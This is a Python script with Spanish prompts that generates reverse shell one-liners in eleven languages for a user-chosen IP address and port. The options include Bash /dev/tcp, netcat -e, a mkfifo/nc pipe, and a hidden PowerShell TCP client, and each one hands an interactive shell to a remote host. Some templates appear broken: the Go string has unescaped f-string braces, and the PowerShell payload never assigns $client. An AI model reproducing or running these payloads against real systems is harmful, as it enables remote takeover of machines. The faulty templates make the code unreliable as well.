import sys
import re
import signal
import os

# COLORS
green_colour = "\033[0;32m\033[1m"
end_colour = "\033[0m"
red_colour = "\033[0;31m\033[1m"
blue_colour = "\033[0;34m\033[1m"
yellow_colour = "\033[0;33m\033[1m"
purple_colour = "\033[0;35m\033[1m"
turquoise_colour = "\033[0;36m\033[1m"
gray_colour = "\033[0;37m\033[1m"


def def_handler(sig, frame):
    print(f"\n\n{red_colour}[+] Saliendo...!\n{end_colour}")
    sys.exit(1)

#CTRL_C
signal.signal(signal.SIGINT, def_handler)

#CLEAR
os.system("cls" if os.name == "nt" else "clear")

def validate_ip(ip):
    regex = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    return re.match(regex, ip) is not None

# Función para validar el número de puerto
def validate_port(port):
    return port.isdigit() and 0 < int(port) < 65536


# Función para generar el código de la reverse shell según el lenguaje seleccionado
def generate_reverse_shell(option, ip, port):
    if option == 1:  # PHP
        return f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''

    elif option == 2:  # Python
        return f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''

    elif option == 3:  # Ruby
        return f'ruby -rsocket -e \'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''

    elif option == 4:  # Node
        return f'node -e \'const net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);const client = new net.Socket();client.connect({{port: {port}, host: "{ip}"}}, () => {{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});\''

    elif option == 5:  # Powershell
        return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'

    elif option == 6:  # Bash
        return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'

    elif option == 7:  # Go
        return f'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'

    elif option == 8:  # Perl
        return f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''

    elif option == 9:  # Netcat
        return f'nc -e /bin/sh {ip} {port}'

    elif option == 10:  # Java
        return f'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()'

    elif option == 11:  # Custom Option
        return f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'

    # Agrega más lenguajes según sea necesario
    elif option == 12:  # Salir
        sys.exit("Saliendo...!")
    else:
        return 'Opción no válida'

# Imprime las opciones disponibles
print(f"""{blue_colour}
        ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
       ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
       ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   █████╗      ███████╗███████║█████╗  ██║     ██║     
       ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██╔══╝      ╚════██║██╔══██║██╔══╝  ██║     ██║     
       ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ███████╗    ███████║██║  ██║███████╗███████╗███████╗
        ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
      {end_colour}""")
print(f"\n{purple_colour}Opciones disponibles:{end_colour}\n")
print(f"\t{red_colour}1. {end_colour}{yellow_colour}PHP{end_colour}")
print(f"\t{red_colour}2. {end_colour}{yellow_colour}Python{end_colour}")
print(f"\t{red_colour}3. {end_colour}{yellow_colour}Ruby{end_colour}")
print(f"\t{red_colour}4. {end_colour}{yellow_colour}Node{end_colour}")
print(f"\t{red_colour}5. {end_colour}{yellow_colour}Powershell{end_colour}")
print(f"\t{red_colour}6. {end_colour}{yellow_colour}Bash{end_colour}")
print(f"\t{red_colour}7. {end_colour}{yellow_colour}Go{end_colour}")
print(f"\t{red_colour}8. {end_colour}{yellow_colour}Perl{end_colour}")
print(f"\t{red_colour}9. {end_colour}{yellow_colour}Netcat{end_colour}")
print(f"\t{red_colour}10. {end_colour}{yellow_colour}Java{end_colour}")
print(f"\t{red_colour}11. {end_colour}{yellow_colour}Netcat Old Version{end_colour}")
print(f"\t{red_colour}12. {end_colour}{yellow_colour}Salir{end_colour}\n")

while True:


    try:
        option = int(input(f"{purple_colour}Elige el número correspondiente al lenguaje deseado {turquoise_colour}(1-12){end_colour}: {end_colour}"))
        if option < 1 or option > 12:
            print(f"{red_colour}Opción fuera de rango. Inténtalo de nuevo.{end_colour}")
            continue
    except ValueError:
        print(f"{red_colour}Por favor, ingresa un número válido.{end_colour}")
        continue

    ip = input(f"{purple_colour}Ingresa la dirección IP: {end_colour}")

    if not validate_ip(ip):
        print(f"{red_colour}La dirección IP ingresada no es válida. Inténtalo de nuevo.{end_colour}")
        continue

    port = input(f"{purple_colour}Ingresa el puerto: {end_colour}")
    if not validate_port(port):
        print(f"{red_colour}El número de puerto ingresado no es válido. Inténtalo de nuevo.{end_colour}")
        continue

    break

# Genera la reverse shell
reverse_shell = generate_reverse_shell(option, ip, port)

# Imprime la reverse shell generada
print(f"\n{green_colour}Reverse shell generada:{end_colour}\n")
print(f"{turquoise_colour}{reverse_shell}{end_colour}")
